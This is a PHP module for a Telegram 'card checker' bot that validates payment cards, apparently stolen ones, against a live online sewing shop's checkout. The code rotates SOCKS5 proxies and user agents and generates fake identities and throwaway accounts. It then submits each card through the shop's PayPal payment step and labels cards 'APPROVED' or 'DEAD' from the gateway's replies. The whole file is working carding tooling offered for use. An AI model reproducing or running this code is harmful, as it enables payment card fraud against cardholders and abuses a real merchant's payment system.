<?php
if(strpos($message, '$nl') === 0 or strpos($message, '/nl') === 0 or strpos($message, '.nl') === 0){
$NameGater ='Noelle';
$gateway = '/nl :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #



#EMPIEZA EL PROCESO DE CHEQUEO

#------[CURL-2]------#


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ WAIT A FEW SECONDS 🟨 ]
Gateway » Noelle
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


$socks5 = socks5();
$rotate = rotate(); 

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);


$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;




$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos


if(strlen($ano) == 2 ){
    $ano = "20".$ano;
}

if ($mes < 10) {
    $mes = substr($mes, -1);
}


while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://sewcreativecottage.com',
            'referer: https://sewcreativecottage.com/p/J41/jenny-haskins-love-of-lilies.html',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $data = 'Action=ADPR&Screen=PROD&Store_Code=SCC&Product_Code=J41&Category_Code=JHDC&Product_Attribute_Count=&Quantity=1&x=40&y=7';
        $req2 = $curl::Post('https://sewcreativecottage.com/merchant.mvc?', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'referer: https://sewcreativecottage.com/merchant.mvc?Screen=OINF&Store_Code=SCC',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Get('https://sewcreativecottage.com/merchant.mvc?Screen=ACNT&Order=1&Store_Code=SCC', $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://sewcreativecottage.com',
            'referer: https://sewcreativecottage.com/merchant.mvc?',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $data = 'Store_Code=SCC&Action=ICST&Order=1&Screen=OINF&Customer_Login='.$lastname.rand(134,99392).'&Customer_PasswordEmail='.urlencode($email).'&Customer_Password=Password322&Customer_VerifyPassword=Password322&Customer_BillFirstName='.$firstname.'&Customer_BillLastName='.$lastname.'&Customer_BillEmail='.urlencode($email).'&Customer_BillPhone=9013164000&Customer_BillAddress1=425+New+Byhalia+Rd&Customer_BillAddress2=&Customer_BillCity=Collierville&Customer_BillStateSelect=TN&Customer_BillState=&Customer_BillZip=38017&Customer_BillCountry=US&Customer_ShipFirstName='.$firstname.'&Customer_ShipLastName='.$lastname.'&Customer_ShipEmail='.urlencode($email).'&Customer_ShipPhone=9013164000&Customer_ShipAddress1=425+New+Byhalia+Rd&Customer_ShipAddress2=&Customer_ShipCity=Collierville&Customer_ShipStateSelect=TN&Customer_ShipState=&Customer_ShipZip=38017&Customer_ShipCountry=US';
        $req2 = $curl::Post('https://sewcreativecottage.com/merchant.mvc?', $data, $headers, $cookie, $server);


        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://sewcreativecottage.com',
            'referer: https://sewcreativecottage.com/merchant.mvc?',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $data = 'Action=ORDR&Screen=OUSL&Action=RDGC&Store_Code=SCC&GiftCertificate_Code=&BillFirstName='.$firstname.'&BillLastName='.$lastname.'&BillEmail='.urlencode($email).'&BillPhone=9013164000&BillAddress1=425+New+Byhalia+Rd&BillAddress2=&BillCity=Collierville&BillStateSelect=TN&BillState=&BillZip=38017&BillCountry=US&Update_Customer=Yes&ShipFirstName='.$firstname.'&ShipLastName='.$lastname.'&ShipEmail='.urlencode($email).'&ShipPhone=9013164000&ShipAddress1=425+New+Byhalia+Rd&ShipAddress2=&ShipCity=Collierville&ShipStateSelect=TN&ShipState=&ShipZip=38017&ShipCountry=US';
        $req2 = $curl::Post('https://sewcreativecottage.com/merchant.mvc?', $data, $headers, $cookie, $server);

        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }


        $ShippingMethod = trim(strip_tags($curl::ParseString($req2->body, '<input type="radio" name="ShippingMethod" value="', '"')));

        $option = [
            '5' => 'paypaladv:MASTERCARD',
            '4' => 'paypaladv:VISA',
            '3' => 'paypaladv:AMEX',
            '6' => 'paypaladv:DISCOVER',

        ];
        $gt = urlencode($option[substr($cc ,0,1)]);

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $data = 'Screen=OPAY&Action=SHIP%2CPSHP%2CCTAX&Store_Code=SCC&ShippingMethod='.urlencode($ShippingMethod).'&PaymentMethod='.$gt.'&question1=&maxquestions=3';
        $req2 = $curl::Post('https://sewcreativecottage.com/merchant.mvc?', $data, $headers, $cookie, $server);

        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $PaymentAuthorizationToken = trim(strip_tags($curl::ParseString($req2->body, '<input type="hidden" name="PaymentAuthorizationToken" value="', '"')));

        

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type: application/x-www-form-urlencoded',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $data = 'Action=AUTH&Screen=INVC&Store_Code=SCC&PaymentAuthorizationToken='.$PaymentAuthorizationToken.'&PaymentMethod='.$gt.'&PayPalAdv_CardNumber='.$cc.'&PayPalAdv_CardExp_Month='.$mes.'&PayPalAdv_CardExp_Year='.$ano.'&PayPalAdv_CardCvv='.$cvv.'&question1=&question2=&question3=&maxquestions=3';
        $req2 = $curl::Post('https://sewcreativecottage.com/merchant.mvc?', $data, $headers, $cookie, $server);

        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}

$mgs = trim(strip_tags($curl::ParseString($req2->body, '<font color="red">', '</font>')));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);

bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Noelle  
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


if(substr_count($req2->body, 'CVV2 Mismatch')){
$status = "APPROVED ✅ ";
$response = "CVV2 Mismatch";
}elseif(substr_count($req2->body, 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($req2->body, 'Insufficient Funds')){
$status = "APPROVED ✅ ";
$response = "Insufficient Funds";
}elseif(substr_count($req2->body, 'Gateway Rejected: avs')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: avs";
}elseif(substr_count($req2->body, 'Add a new payment method')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $mgs;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card ⤿  <code>$cc|$mes|$ano|$cvv</code> 
Status ⤿  $status
Response ⤿ $response 
Gateway ⤿ $NameGater
──────────────────────
◈Country ⤿ <code>$country </code>$emoji 
◈Type ⤿ <code>$type</code> 
◈Level ⤿ <code>$scheme</code>
◈Vendor ⤿ <code>$brand</code>
◈Bank ⤿ <code>$bank </code> 
──────────────────────
Time ⤿  $tiempo s | retries $retries
@RitaaChk_Bot
Chk By ⤿ <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>


